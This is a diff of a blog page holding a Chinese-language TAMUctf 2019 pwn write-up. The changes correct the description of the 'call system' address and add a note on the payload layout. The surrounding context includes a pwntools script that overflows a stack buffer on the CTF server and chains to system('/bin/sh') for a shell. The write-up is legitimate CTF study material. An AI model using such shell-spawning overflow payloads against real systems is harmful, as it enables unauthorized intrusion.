@@ -64,7 +64,7 @@
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/08/TAMUctf-Pwn-writeup/7.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/08/TAMUctf-Pwn-writeup/8.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/08/TAMUctf-Pwn-writeup/9.png">
-<meta property="og:updated_time" content="2019-03-09T12:40:44.055Z">
+<meta property="og:updated_time" content="2019-03-23T14:45:24.969Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TAMUctf Pwn writeup">
 <meta name="twitter:description" content="虽然是灰常easy的题，但对我这种刚刚准备入门Pwn的菜鸡来说，再合适不过了。 Pwn1题目如下：pwn1  运行程序，功能是询问你名字并让你输入内容；该ELF文件是动态链接的；checksec查看发现只有Canary没有打开：  打开IDA分析一下，gets()函数明显地存在栈溢出漏洞，且当v5变量等于一个值时便调用print_flag()函数输出flag：  右键v5所在的if条件对应的值&amp;g">
@@ -282,11 +282,12 @@
 <p>但是吧，还是要按部就班地用Pwn的方法做。可以确定了，是利用ret2libc来实现getshell，因为这里已经有了system()函数，剩下的就是找/bin/sh字符串了。</p>
 <p>打开String窗口，看到真的有/bin/sh字符串，地址为0x0804A034：</p>
 <p><img src="/2019/03/08/TAMUctf-Pwn-writeup/6.png" alt=""></p>
-<p>再看下system()函数地址，为0x080485AD：</p>
+<p>再看下call system()的地址，为0x080485AD：</p>
 <p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/1.png" alt=""></p>
 <p>和ret2libc1原理一致，如下图：</p>
 <p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/3.png" alt=""></p>
 <p>编写payload：</p>
+<p>其实这里system_addr地址并非system()函数地址而是call system的地址，所以此处无需再添加返回地址。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn.tamuctf.com"</span>, <span class="number">4324</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Enter the arguments you would like to pass to ls:"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x080485AD</span></span><br><span class="line">binsh_addr = <span class="number">0x0804A034</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x21</span>, <span class="string">"BBBB"</span>, system_addr, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>getshell：</p>
 <p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/2.png" alt=""></p>
